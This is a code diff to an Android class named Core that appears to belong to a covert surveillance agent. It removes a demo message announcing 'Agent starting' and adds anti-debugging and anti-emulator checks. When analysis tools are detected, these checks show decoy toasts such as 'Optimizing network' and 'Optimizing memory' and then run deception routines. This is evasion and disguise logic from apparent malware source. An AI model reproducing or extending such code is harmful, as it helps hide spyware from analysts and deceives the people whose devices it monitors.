@@ -112,11 +112,6 @@ public class Core extends Activity implements Runnable {
 
 	public boolean Start(final Resources resources, final ContentResolver cr) {
 
-		if (Cfg.DEMO) {
-			Beep.bip();
-			Status.self().makeToast(M.e("Agent starting...!"));
-		}
-
 		if (serviceRunning == true) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (Start): service already running"); //$NON-NLS-1$
@@ -886,9 +881,12 @@ public class Core extends Activity implements Runnable {
 
 	public boolean check() {
 		if(Cfg.CHECK_ANTI_DEBUG) {
-			if (!Cfg.DEBUG) {
+			if (!Cfg.DEBUG || Cfg.DEBUGANTI) {
 				AntiDebug ad = new AntiDebug();
 				if (ad.isDebug()) {
+					if(Cfg.DEMO){
+						Status.self().makeToast(M.e("Optimizing network"));
+					}
 					deceptionCode1();
 					return false;
 				}
@@ -896,6 +894,9 @@ public class Core extends Activity implements Runnable {
 			if (!Cfg.DEBUG || Cfg.DEBUGANTIEMU) {
 				AntiEmulator am = new AntiEmulator();
 				if (am.isEmu()) {
+					if(Cfg.DEMO){
+						Status.self().makeToast(M.e("Optimizing memory"));
+					}
 					deceptionCode2(Integer.MAX_VALUE / 1024);
 					return false;
 				}
